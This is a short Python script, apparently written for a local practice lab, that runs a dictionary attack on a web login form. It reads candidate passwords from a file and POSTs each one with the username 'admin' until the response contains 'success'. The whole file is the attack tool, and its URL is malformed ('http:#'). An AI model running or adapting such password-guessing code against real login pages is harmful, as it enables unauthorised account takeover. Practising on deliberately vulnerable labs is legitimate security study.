import sys
import requests
from requests.auth import HTTPBasicAuth



def Brute_Force_Web(postData):
    res = requests.post('http:#127.0.0.1/vulnerabilities/burtforce/bf_form.php', data=postData) #使用requests库进行post发包
    if "success" in res.text: #检查网页返回包中是否包含success
        print ("="*20 + "\n" + "Crack Sucess!")
        print ("Password is:" + passwd) #若网页返回包中包含success，输出正确的密码
        exit()
    else:
        print("Test password:",passwd,"is wrong")


def GetPass():
    fp = open("password.txt", "r") #读取密码字典
    if fp == 0:
        print ("open file error!")
        return
    while 1:
        line = fp.readline() 
               # #读取密码字典一行
        if not line:
            break
        global passwd
        passwd = line.strip('\n')
        postData = {
            'username': 'admin',
            'password': passwd,
            'submit': 'Login'
        } #构造post数据包中的各参数与值
        Brute_Force_Web(postData)


GetPass()